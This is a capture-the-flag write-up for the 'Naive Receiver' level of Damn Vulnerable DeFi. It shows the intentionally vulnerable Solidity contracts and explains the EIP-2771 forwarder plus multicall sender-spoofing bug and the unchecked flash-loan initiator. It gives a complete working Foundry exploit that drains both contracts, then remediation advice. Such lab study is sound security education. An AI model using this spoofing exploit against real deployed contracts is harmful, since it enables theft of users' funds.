---
Created: 2026-11-23
tags:
  - web3
  - easy
  - EIP-2771
---
# 1. Overview of the Files
## Scenario & Objective

```bash
┌──(mdn0x㉿mdn0xKali)-[~/Web3SEC/damn-vulnerable-defi]
└─$ ls -la src/naive-receiver/ test/naive-receiver/
src/naive-receiver/:
totale 28
drwxrwxr-x  2 mdn0x mdn0x 4096 23 nov 14.54 .
drwxrwxr-x 20 mdn0x mdn0x 4096 23 nov 14.54 ..
-rw-rw-r--  1 mdn0x mdn0x 3412 23 nov 14.54 BasicForwarder.sol
-rw-rw-r--  1 mdn0x mdn0x 1323 23 nov 14.54 FlashLoanReceiver.sol
-rw-rw-r--  1 mdn0x mdn0x  609 23 nov 14.54 Multicall.sol
-rw-rw-r--  1 mdn0x mdn0x 3153 23 nov 14.54 NaiveReceiverPool.sol
-rw-rw-r--  1 mdn0x mdn0x  435 23 nov 14.54 README.md

test/naive-receiver/:
totale 12
drwxrwxr-x  2 mdn0x mdn0x 4096 23 nov 14.54 .
drwxrwxr-x 20 mdn0x mdn0x 4096 23 nov 14.54 ..
-rw-rw-r--  1 mdn0x mdn0x 3139 23 nov 14.54 NaiveReceiver.t.sol
```
## Files Analysis

```js
└─$ cat ../../test/naive-receiver/NaiveReceiver.t.sol FlashLoanReceiver.sol NaiveReceiverPool.sol 

// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
```

```js
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {WETH, NaiveReceiverPool} from "./NaiveReceiverPool.sol";

contract FlashLoanReceiver is IERC3156FlashBorrower {
    address private pool;

    constructor(address _pool) {
        pool = _pool;
    }

    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        assembly {
            // gas savings
            if iszero(eq(sload(pool.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }

        if (token != address(NaiveReceiverPool(pool).weth())) revert NaiveReceiverPool.UnsupportedCurrency();

        uint256 amountToBeRepaid;
        unchecked {
            amountToBeRepaid = amount + fee;
        }

        _executeActionDuringFlashLoan();

        // Return funds to pool
        WETH(payable(token)).approve(pool, amountToBeRepaid);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // Internal function where the funds received would be used
    function _executeActionDuringFlashLoan() internal {}
}
```

```js
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {FlashLoanReceiver} from "./FlashLoanReceiver.sol";
import {Multicall} from "./Multicall.sol";
import {WETH} from "solmate/tokens/WETH.sol";

contract NaiveReceiverPool is Multicall, IERC3156FlashLender {
    uint256 private constant FIXED_FEE = 1e18; // not the cheapest flash loan
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    WETH public immutable weth;
    address public immutable trustedForwarder;
    address public immutable feeReceiver;

    mapping(address => uint256) public deposits;
    uint256 public totalDeposits;

    error RepayFailed();
    error UnsupportedCurrency();
    error CallbackFailed();

    constructor(address _trustedForwarder, address payable _weth, address _feeReceiver) payable {
        weth = WETH(_weth);
        trustedForwarder = _trustedForwarder;
        feeReceiver = _feeReceiver;
        _deposit(msg.value);
    }

    function maxFlashLoan(address token) external view returns (uint256) {
        if (token == address(weth)) return weth.balanceOf(address(this));
        return 0;
    }

    function flashFee(address token, uint256) external view returns (uint256) {
        if (token != address(weth)) revert UnsupportedCurrency();
        return FIXED_FEE;
    }

    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
        external
        returns (bool)
    {
        if (token != address(weth)) revert UnsupportedCurrency();

        // Transfer WETH and handle control to receiver
        weth.transfer(address(receiver), amount);
        totalDeposits -= amount;

        if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        uint256 amountWithFee = amount + FIXED_FEE;
        weth.transferFrom(address(receiver), address(this), amountWithFee);
        totalDeposits += amountWithFee;

        deposits[feeReceiver] += FIXED_FEE;

        return true;
    }

    function withdraw(uint256 amount, address payable receiver) external {
        // Reduce deposits
        deposits[_msgSender()] -= amount;
        totalDeposits -= amount;

        // Transfer ETH to designated receiver
        weth.transfer(receiver, amount);
    }

    function deposit() external payable {
        _deposit(msg.value);
    }

    function _deposit(uint256 amount) private {
        weth.deposit{value: amount}();

        deposits[_msgSender()] += amount;
        totalDeposits += amount;
    }

    function _msgSender() internal view override returns (address) {
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
            return address(bytes20(msg.data[msg.data.length - 20:]));
        } else {
            return super._msgSender();
        }
    }
}
```


### 1. The Goal (`_isSolved()` in `NaiveReceiver.t.sol`)

Looking at `_isSolved()`, we have **four strict post-conditions**:

1. **`assertLe(vm.getNonce(player), 2)`**: The `player` account can execute **at most 2 transactions**.

2. **`weth.balanceOf(address(receiver)) == 0`**: Drain all `10 WETH` from `FlashLoanReceiver`.

3. **`weth.balanceOf(address(pool)) == 0`**: Drain all `1,000 WETH` from `NaiveReceiverPool`.

4. **`weth.balanceOf(recovery) == 1,010 WETH`**: All `1,010 WETH` (`WETH_IN_POOL + WETH_IN_RECEIVER`) must end up in the `recovery` address.

Notice there are **two separate pools of funds** to drain within $\le 2$ transactions: `10 WETH` inside `FlashLoanReceiver` and `1,000 WETH` inside `NaiveReceiverPool`.

### 2. Vulnerability 1: Draining `FlashLoanReceiver` (`10 WETH`)

Look at `NaiveReceiverPool.flashLoan()`:

```js
uint256 private constant FIXED_FEE = 1e18; // 1 ETH flat fee regardless of loan amount!
```

Anyone can call `pool.flashLoan(receiver, address(weth), 0, "")`—passing **`receiver` as the borrower** instead of `msg.sender`.

In `FlashLoanReceiver.sol`:

```js
function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
```

- It completely ignores the first parameter (`initiator`, who triggered the flash loan). It never checks that `initiator == owner`.

- It blindly approves `pool` to pull `amount + fee` (`0 + 1 WETH = 1 WETH`) from its own balance.

- Inside `NaiveReceiverPool.flashLoan()`, that `1 WETH` fee is credited directly to `feeReceiver` (`deployer`):

```js
deposits[feeReceiver] += FIXED_FEE;
```

**Impact #1:** Calling `flashLoan(receiver, weth, 0, "")` **10 times** drains all `10 WETH` from `receiver` and moves them into `pool`, crediting `deployer`'s internal `deposits[deployer]` balance from `1,000 WETH` to **`1,010 WETH`**.

_(Why can't we just call `flashLoan` 10 times directly from `player`? Because `_isSolved()` restricts `player` to **$\le 2$ transactions**! That's why `NaiveReceiverPool` inherits from `Multicall`—it lets us batch all 10 `flashLoan` calls into a single transaction)._

### 3. Vulnerability 2: Draining `NaiveReceiverPool` (`1,010 WETH`) via `Multicall` + `BasicForwarder`

Now all `1,010 WETH` sit inside `NaiveReceiverPool` under `deposits[deployer]`. How does `player` withdraw `deployer`'s funds?

Look at the bottom of `NaiveReceiverPool.sol`:

```js
function withdraw(uint256 amount, address payable receiver) external {
    deposits[_msgSender()] -= amount;
    totalDeposits -= amount;
    weth.transfer(receiver, amount);
}

function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder && msg.data.length >= 20) {
        return address(bytes20(msg.data[msg.data.length - 20:]));
    } else {
        return super._msgSender();
    }
}
```
Here is the **critical bug** combining **EIP-2771 Meta-Transactions (`BasicForwarder`)** with **`Multicall` (`delegatecall`)**:

1. **How `BasicForwarder` works:** When `player` sends a signed meta-transaction through `BasicForwarder`, `BasicForwarder` calls `pool` (`msg.sender == trustedForwarder`) and **appends the true signer's 20-byte address (`player`)** to the end of `msg.data`. `_msgSender()` reads those last 20 bytes.
   
2. **How `Multicall` breaks it:** `NaiveReceiverPool` inherits `Multicall`, which loops through an array of `bytes[] data` and executes `address(this).delegatecall(data[i])`.
    
    - During `delegatecall`, **`msg.sender` remains `trustedForwarder`**, while **`msg.data` becomes our inner `data[i]` payload**!
 
    - `_msgSender()` only checks `msg.sender == trustedForwarder`—it **never verifies** that `BasicForwarder` actually appended the last 20 bytes of `data[i]`.

    - If we craft the inner calldata for `withdraw(1010e18, recovery)` and manually append `abi.encodePacked(deployer)` (20 bytes) to the end of that `bytes` payload, `_msgSender()` extracts **`deployer`** instead of `player`!


Before writing the PoC in `NaiveReceiver.t.sol`, inspect `Multicall.sol` and `BasicForwarder.sol` to see the exact struct fields and EIP-712 signature format required by `forwarder.execute(...)`:

```js
─$ cat src/naive-receiver/Multicall.sol src/naive-receiver/BasicForwarder.sol
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {Context} from "@openzeppelin/contracts/utils/Context.sol";

abstract contract Multicall is Context {
    function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
        results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            results[i] = Address.functionDelegateCall(address(this), data[i]);
        }
        return results;
    }
}
```

```js
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {EIP712} from "solady/utils/EIP712.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

interface IHasTrustedForwarder {
    function trustedForwarder() external view returns (address);
}

contract BasicForwarder is EIP712 {
    struct Request {
        address from;
        address target;
        uint256 value;
        uint256 gas;
        uint256 nonce;
        bytes data;
        uint256 deadline;
    }

    error InvalidSigner();
    error InvalidNonce();
    error OldRequest();
    error InvalidTarget();
    error InvalidValue();

    bytes32 private constant _REQUEST_TYPEHASH = keccak256(
        "Request(address from,address target,uint256 value,uint256 gas,uint256 nonce,bytes data,uint256 deadline)"
    );

    mapping(address => uint256) public nonces;

    /**
     * @notice Check request and revert when not valid. A valid request must:
     * - Include the expected value
     * - Not be expired
     * - Include the expected nonce
     * - Target a contract that accepts this forwarder
     * - Be signed by the original sender (`from` field)
     */
    function _checkRequest(Request calldata request, bytes calldata signature) private view {
        if (request.value != msg.value) revert InvalidValue();
        if (block.timestamp > request.deadline) revert OldRequest();
        if (nonces[request.from] != request.nonce) revert InvalidNonce();

        if (IHasTrustedForwarder(request.target).trustedForwarder() != address(this)) revert InvalidTarget();

        address signer = ECDSA.recover(_hashTypedData(getDataHash(request)), signature);
        if (signer != request.from) revert InvalidSigner();
    }

    function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
        _checkRequest(request, signature);

        nonces[request.from]++;

        uint256 gasLeft;
        uint256 value = request.value; // in wei
        address target = request.target;
        bytes memory payload = abi.encodePacked(request.data, request.from);
        uint256 forwardGas = request.gas;
        assembly {
            success := call(forwardGas, target, value, add(payload, 0x20), mload(payload), 0, 0) // don't copy returndata
            gasLeft := gas()
        }

        if (gasLeft < request.gas / 63) {
            assembly {
                invalid()
            }
        }
    }

    function _domainNameAndVersion() internal pure override returns (string memory name, string memory version) {
        name = "BasicForwarder";
        version = "1";
    }

    function getDataHash(Request memory request) public pure returns (bytes32) {
        return keccak256(
            abi.encode(
                _REQUEST_TYPEHASH,
                request.from,
                request.target,
                request.value,
                request.gas,
                request.nonce,
                keccak256(request.data),
                request.deadline
            )
        );
    }

    function domainSeparator() external view returns (bytes32) {
        return _domainSeparator();
    }

    function getRequestTypehash() external pure returns (bytes32) {
        return _REQUEST_TYPEHASH;
    }
}
```


`Multicall.sol` (Batching via `delegatecall`)
- **Purpose:** Allows a caller to bundle multiple function calls into a single transaction.

- **EVM Mechanics (`delegatecall`):** Each element `data[i]` is executed in the storage context of `NaiveReceiverPool`. Crucially, **`delegatecall` preserves `msg.sender` and `msg.value`** from the outer call, while replacing `msg.data` with the inner payload `data[i]`.

`BasicForwarder.sol` (EIP-2771 Meta-Transaction Relayer)

- **Purpose:** Verifies an off-chain EIP-712 typed signature (`Request` struct) and forwards the call to `request.target`.

- **Calldata Appending (`execute()`):**   

```js 
bytes memory payload = abi.encodePacked(request.data, request.from);
assembly {
    success := call(forwardGas, target, value, add(payload, 0x20), mload(payload), 0, 0)
}
```

When `BasicForwarder` calls `target`, it appends the verified signer's 20-byte address (`request.from`) to the end of `request.data`.

Additional Notable Findings:
1. **EIP-150 Gas Forwarding Check**:  Because the EVM reserves `1/64` of remaining gas during a `CALL`, this check prevents a relayer from deliberately supplying insufficient gas to make the inner `target` call run out of gas while still marking the outer `execute()` transaction successful (which would burn the user's `nonce` without executing their action).

2. **Silent Inner Revert:** Notice `execute()` returns `bool success` from the low-level `call`, rather than reverting if `success == false`. A caller must inspect the return boolean if they care whether the inner call reverted.

# The Vulnerability

The critical vulnerability emerges from **combining both patterns inside `NaiveReceiverPool.sol`**

1. Trusted Forwarder Assumption (`NaiveReceiverPool._msgSender()`):

`_msgSender()` assumes that whenever `msg.sender == trustedForwarder`, the last 20 bytes of `msg.data` were authentically appended by `BasicForwarder`.

2. **Context Confusion via `multicall`:**

- An external caller routes a valid signed `Request` through `BasicForwarder.execute()` targeting `NaiveReceiverPool.multicall(bytes[] data)`.
    
- `BasicForwarder` appends `request.from` to the outer `multicall` calldata and invokes `NaiveReceiverPool`. Inside `multicall`, `msg.sender` is `trustedForwarder`.
    
- `multicall` then iterates over `data[i]` and calls `address(this).delegatecall(data[i])`.
    
- During `delegatecall`, `msg.sender` **remains `trustedForwarder`**, while `msg.data` becomes the **unauthenticated inner byte array `data[i]`**.
    
- Because `_msgSender()` blindly slices the last 20 bytes of `msg.data` without verifying that the call came directly from `BasicForwarder` (rather than via `delegatecall`), any arbitrary 20-byte address placed at the end of `data[i]` is treated as the authenticated caller.

3. **Combined Attack Impact**:

    Step A (Fee Draining): multicall batches 10 calls to flashLoan(receiver, weth, 0, ""). Because FlashLoanReceiver does not validate initiator and pays a flat 1 WETH fee per loan, its 10 WETH balance is drained into NaiveReceiverPool and credited to deposits[deployer] (1,010 WETH total).

    Step B (Identity Spoofing): In the same batch, multicall invokes withdraw(1010e18, recovery) with deployer's 20-byte address appended to the inner calldata, causing _msgSender() to resolve to deployer and transfer all 1,010 WETH out of the pool.

# Exploit PoC

In simple terms, you have two "vaults" to drain in a single transaction (since the test restricts you to at most 2 transactions from your `player` account), using a two-step trick bundled into one call.

Picture the scenario like a two-act bank heist executed all in one go:

## Act 1: Draining the First Vault (`FlashLoanReceiver` — holds 10 WETH)

- **The Problem:** The `FlashLoanReceiver` contract holds 10 WETH, and you cannot withdraw them directly. However, it has a flaw: **anyone** can request a flash loan on its behalf, and it automatically pays a **flat 1 WETH fee** every single time—even if the loan amount is **0 WETH**.

- **What You Need to Do:** Trigger **10 flash loans of 0 WETH** on behalf of `receiver`. Each time, `receiver` loses 1 WETH in fees, which goes into the main pool (`pool`) and is credited to the `deployer`'s account.

- After 10 calls: `receiver` is down to **0 WETH**, and `pool` now holds **1,010 WETH**—all credited to `deployer`.


## Act 2: Taking the 1,010 WETH from the Pool (`NaiveReceiverPool`)

- **The Problem:** The 1,010 WETH are inside `pool`, but they are recorded under `deployer`'s name. If you (`player`) try to withdraw them, `pool` blocks you because your internal deposit balance is 0.

- **The Trick (The Real Bug):**
    
    1. `pool` trusts a specific "mailman" (`BasicForwarder`): when the mailman delivers an envelope, it writes the sender's address in the last 20 bytes of the envelope, and `pool` reads those 20 bytes to identify who is requesting the funds (`_msgSender()`).
 
    2. However, `pool` also has a `multicall` function (which lets you put multiple inner envelopes inside one big outer envelope). When `pool` opens the inner envelopes using `delegatecall`, it still sees that the trusted mailman delivered the outer envelope, **but it reads the last 20 bytes of the inner envelope that you wrote**, rather than the ones verified by the mailman!
 
- **What You Need to Do:** Prepare an eleventh call to withdraw all `1,010 WETH` (`withdraw`) and send them to the `recovery` address, and paste the **20 bytes of `deployer`'s address** at the very end of that payload. `pool` falls for it, assumes `deployer` is requesting their own funds, and sends everything to `recovery`.

## In Practice

What Goes Inside  `test_naiveReceiver()

We need to build a single batch (`multicall`) containing **11 instructions** inside a `bytes[]` array:

1. **Instructions 0–9 (10 times):** The encoded call (`abi.encodeCall`) to request a flash loan of `0` WETH for `receiver`.

2. **Instruction 10 (the last one):** The encoded call for `withdraw(1010e18, recovery)` with `deployer`'s address appended (`abi.encodePacked`) to the end.

3. **Delivery:** Wrap this `multicall` inside a signed request (`BasicForwarder.Request`) using the private key `playerPk` (via `vm.sign`) and execute it through `forwarder.execute(...)` in a single transaction.


Here is how those three Solidity/Foundry primitives (`abi.encodeCall`, `abi.encodePacked`, and `vm.sign` with EIP-712) work conceptually and structurally so you can write clean Foundry tests on your own.

### 1. Encoding Function Calls (`abi.encodeCall`)

In Solidity, when you want to pass a function call as raw `bytes` (for instance, into a `multicall(bytes[] calldata data)` array), you need to serialize the **4-byte function selector** plus the **ABI-encoded arguments**.


```js
bytes memory callPayload = abi.encodeCall(ContractName.functionName, (arg1, arg2, ...));
```

- **Why `abi.encodeCall` over `abi.encodeWithSignature`?**`abi.encodeCall` is **type-checked by the compiler**. If you pass a `uint256` where an `address` is expected, or misspell the function name, `forge build` will immediately catch it at compile time instead of failing silently at runtime.

- **Building a `bytes[]` array in memory:** Dynamic memory arrays in Solidity must be initialized with a fixed length using `new bytes[](length)`:

    ```js
    bytes[] memory calls = new bytes[](11);
    for (uint256 i = 0; i < 10; i++) {
        calls[i] = abi.encodeCall(pool.flashLoan, (receiver, address(weth), 0, ""));
    }
    ```

### 2. Tight Byte Concatenation (`abi.encodePacked`)

Whereas `abi.encode` pads every argument to 32-byte words (standard ABI encoding), `abi.encodePacked` concatenates raw bytes **without padding**.


- **Size behavior:**

- `abi.encode(deployer)` $\rightarrow$ **32 bytes** (12 zero bytes + 20-byte address)

- `abi.encodePacked(deployer)` $\rightarrow$ **20 bytes** (exact raw address length)

- **How EIP-2771 forwarders use it:** An EIP-2771 forwarder appends the sender's raw 20-byte address directly to the end of existing calldata:


   
    ```js
    bytes memory rawCall = abi.encodeCall(pool.withdraw, (amount, payable(recovery)));
    bytes memory calldataWithSuffix = abi.encodePacked(rawCall, deployer);
    ```

When the receiving contract slices `msg.data[msg.data.length - 20:]`, it reads those exact trailing 20 bytes as an `address`.

### 3. Signing EIP-712 Typed Data in Foundry (`vm.sign`)

To interact with an EIP-712 relayer (`BasicForwarder`), you construct the struct, compute its EIP-712 digest, and sign that 32-byte digest using Foundry's `vm.sign` cheatcode.

1. **Construct the `Request` struct:** Match the exact field names and types declared in `BasicForwarder.Request`:

    ```js
    BasicForwarder.Request memory req = BasicForwarder.Request({
        from: player,
        target: address(pool),
        value: 0,
        gas: 1_000_000,
        nonce: forwarder.nonces(player),
        data: abi.encodeCall(pool.multicall, (calls)),
        deadline: block.timestamp + 1 hours
    });
    ```

2. **Compute the EIP-712 Digest:** EIP-712 digests always follow the standard `0x19 0x01 || domainSeparator || structHash` layout:


    ```js
    bytes32 digest = keccak256(
        abi.encodePacked(
            "\x19\x01",
            forwarder.domainSeparator(),
            forwarder.getDataHash(req)
        )
    );
    ```

_(Notice `BasicForwarder.sol` exposes both `domainSeparator()` and `getDataHash(Request)` as public/external view/pure helper functions)._

1. **Sign with `vm.sign` and pack `(r, s, v)`:** Foundry's `vm.sign(privateKey, digest)` returns `(uint8 v, bytes32 r, bytes32 s)`. OpenZeppelin's `ECDSA.recover` expects a 65-byte signature ordered as **`r || s || v`**:

    ```js
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
    bytes memory signature = abi.encodePacked(r, s, v);
    ```

2. **Submit via `forwarder.execute`:**

```js
       forwarder.execute(req, signature);
```

### Putting It Together in `NaiveReceiver.t.sol`

Inside `test_naiveReceiver()`, combine those four pieces in order:

1. Allocate `bytes[] memory calls = new bytes[](11);` and populate indices `0..9` with `flashLoan` calls and index `10` with the suffixed `withdraw` call.

2. Build `BasicForwarder.Request` with `data: abi.encodeCall(pool.multicall, (calls))`.

3. Compute `digest`, generate `(v, r, s)` via `vm.sign(playerPk, digest)`, and pack `signature`.

4. Call `forwarder.execute(req, signature)` and run `forge test --match-path test/naive-receiver/NaiveReceiver.t.sol -vvvv` to inspect the execution trace.


```js
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {

    bytes[] memory calls = new bytes[](11);
        for (uint256 i = 0; i < 10; i++) {
            calls[i] = abi.encodeCall(pool.flashLoan, (receiver, address(weth), 0, ""));
    }
    calls[10] = abi.encodePacked(
        abi.encodeCall(pool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
        deployer
    );


    BasicForwarder.Request memory req = BasicForwarder.Request({
        from: player,
        target: address(pool),
        value: 0,
        gas: 1_000_000,
        nonce: forwarder.nonces(player),
        data: abi.encodeCall(pool.multicall, (calls)),
        deadline: block.timestamp + 1 hours
    });

    bytes32 digest = keccak256(
        abi.encodePacked(
            "\x19\x01",
            forwarder.domainSeparator(),
            forwarder.getDataHash(req)
        )
    );

    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest); 
    bytes memory signature = abi.encodePacked(r, s, v);

    forwarder.execute(req, signature);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
```

Test:

```bash
-$ forge test --match-path NaiveReceiver.t.sol -vvvv

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 20.11ms (17.98ms CPU time)
Ran 1 test suite in 2.18s (20.11ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```
# Remediation (Production Fixes)

1. **Prevent `Multicall` + ERC-2771 Spoofing:**
    
    - Use OpenZeppelin's `ERC2771Context` together with OpenZeppelin's `Multicall` (v5+), which explicitly checks `_isTrustedForwarder(msg.sender)` and propagates the verified context safely—or **disable `multicall` when `msg.sender == trustedForwarder`**.

2. **Validate Flash Loan Initiator (`FlashLoanReceiver.sol`):**

    - Check `if (initiator != owner) revert UnauthorizedInitiator();` inside `onFlashLoan()` so third parties cannot trigger fee-bearing flash loans on behalf of the receiver contract.

3. **Avoid Flat Fees on Zero-Amount Loans (`NaiveReceiverPool.sol`):**
    
    - Require `amount > 0` in `flashLoan()` and calculate fees proportionally (`amount * FEE_BPS / 10_000`) rather than charging a fixed `1 ETH` fee on `0`-value loans.


